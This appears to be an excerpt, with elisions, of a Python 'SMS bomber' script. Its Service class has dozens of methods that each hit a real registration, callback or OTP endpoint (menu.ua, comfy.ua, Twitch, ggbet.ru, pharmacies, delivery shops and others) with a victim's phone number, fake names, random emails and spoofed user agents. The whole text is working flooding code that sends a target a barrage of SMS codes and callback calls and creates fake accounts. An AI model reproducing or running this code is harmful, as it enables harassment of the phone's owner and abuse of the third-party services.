...
class Service():
    ...
    def menuau(self):
        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
          data={'user_info[fullname]':'Алексей',
    ...
    def online_sbis(self):
        requests.post('https://online.sbis.ru/reg/service/', json={'firstName':'паша',  'middleName':'Алексей',  'lastName':'Алексей',  'sex':'1',  'birthDate':'7.9.1997',  'mobilePhone':self.phone,  'russianFederationResident':'true',  'isDSA':'false',  'personalDataProcessingAgreement':'true',  'bKIRequestAgreement':'null',  'promotionAgreement':'true'}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
    ...
    def comfy_ua(self):
        requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':'Алексей',  'registration_phone':self.phone,  'registration_email':email()}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
    ...
    def panda99(self):
        requests.post('https://panda99.ru/bdhandlers/order.php?t={int(time())}', data={'CB_NAME':'Алексей',
         'CB_PHONE':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
    ...
    def gnevskii(self):
        requests.post('https://xn--b1abgnfccv2b.xn--p1ai/scripts/form-u18785.php', data={'custom_U18799':'Алексей',  'custom_U18791':self.phone,  'custom_U18795':'1'}, headers={'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),  'DNT':'1'})
    ...
    def eshko(self):
        ...
        requests.post('https://www.eshko.by/orders/create/free_download', data={'kurs':'1',
         'iname':'Алексей',  'fname':'Алексей',  'email':email(),  'phone':self.phone},
          headers=headers)
    ...
    def carte(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         ...
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://carte.by/auth/', data={'ajax':'register',  'login':username(),  'pass':"helloworld22V1#",  'phone':self.phone,  'company':0,  'resend':1,  'checksum':504}, headers=headers)
    ...
    def bettery_ru(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         ...
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={'fio':'Алексей',  'password':'helloworld22V1#',  'email':email(),  'emailAdvertAccepted':'true',  'phoneNumber':self.phone,  'webReferrer':'',  'advertInfo':'',  'platformInfo':agent,  'promoId':'',  'sysId':1,  'lang':'ru'})
    ...
    def alloua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA', headers=headers_copy, data={'firstname':'Алексей',  'telephone':self.phone_not_pluse[1:],  'email':email(),  'password':'46lX2dnyUhDQ',  'form_key':'No7l3BqVVoQJ6Djm'})
    ...
    def passporttwitchtv_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://passport.twitch.tv/register?trusted_request=true', headers=headers_copy, json={'birthday':{'day':1,  'month':9,  'year':1997},  'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',  'include_verification_code':True,  'password':"helloworld22V1#",  'phone_number':self.phone_not_pluse,  'username':username()})
    ...
    def ggbetru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://ggbet.ru/api/auth/register-with-phone', headers=headers_copy, data={'phone':self.phone,  'login':email(),  'password':"helloworld22V1#",  'agreement':'on',  'oferta':'on'})
    ...
    def apteka_one(self):
        try:
            ...
            password = "helloworld22V1#"
            for i in range(2):
                requests.post('https://apteka38plus.ru/register/confirm', data={'_token':token,  'name':'Алексей',  'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
                 'email':email(),
    ...
    def zoloto585_2(self):
        ...
        print(ddd)
        requests.post('https://zoloto585.ru/api/bcard/reg2/', json={'birthdate': ddd, 'city': "Москва", 'email': email(), 'name': 'Алексей', 'patronymic': 'Алексей', 'phone': phone_mask(self.phone_not_pluse, "+# (###) ###-###-##"), 'sex': "m", 'surname':'Алексей'}, headers=headers_copy)
    ...
    def apizenkyio(self):
        ...
        phone = phone_mask(self.phone_not_pluse, "+# (###) ###-##-##")
        requests.post('https://api.zenky.io/v2/auth/register', json={'phone':phone, 'phone_country': "RU", 'password': "helloworld22V1#"}, headers={'User-Agent':headers_copy,'x-store-id': '92037185-cce3-45dd-bf11-b52fe4a9cdc1'})
    ...
    def rollserv(self):
        ...
        requests.post('https://rollserv.ru/user/NewUser/?async=json', data={'type': '2', 'ext[2][1]': 'Алексей', 'user[cellphone]': self.phone, 'user[i_agree]': 'on'}, headers=headers_copy)
    ...
    def antisushiru(self):
        ...
        requests.post('https://anti-sushi.ru/?auth',
                        data={'CSRF': None, 'ACTION': 'REGISTER', 'Session': req.cookies['SID'], 'NAME': 'Алексей',
    ...
    def biuaapiv(self):
        ...
        requests.post('https://bi.ua/api/v1/accounts', data={"grand_type":"sms_code","stage":"1","login":'Алексей',"phone":self.phone_not_pluse}, headers=headers_copy)
    ...
    def phonetua(self):
        ...
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://phonet.ua/rest/public/order/sm', data={"name":'Алексей',"phone":self.phone}, headers=headers_copy)
    ...
    def pravdop(self):
        requests.post('https://pravdop.com/callback.php', data={'phone':self.phone,'name':'Алексей','lang':' ','form':'%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA'})
    ...
    def wwwhyundai_vostokru(self):
        ...
        phone=phone_mask(self.phone_not_pluse, '#(###)-###-##-##')
        requests.get(f'https://www.hyundai-vostok.ru/api/send/CallBack?name=Алексей&tel=%2B{phone}&center=&time=', headers=headers_copy)

    def perevozimvse(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('http://www.perevozimvse.ru/callback.asp', data={'fio':'Алексей','phone':self.phone_not_pluse}, headers=headers_copy)
...
'x-requested-with': 'XMLHttpRequest'}
    ...
    def apteka24ua(self):
        requests.post('https://ucb.z.apteka24.ua/api/send/otp',
            headers={'User-Agent': user_agent()},
            data={'phone':self.phone_not_pluse})

    def anc(self):
        requests.post('https://aptekanizkihcen.ua/authorization/auth/v2/register',
            headers={'User-Agent': user_agent()},
            data={'login':self.phone})
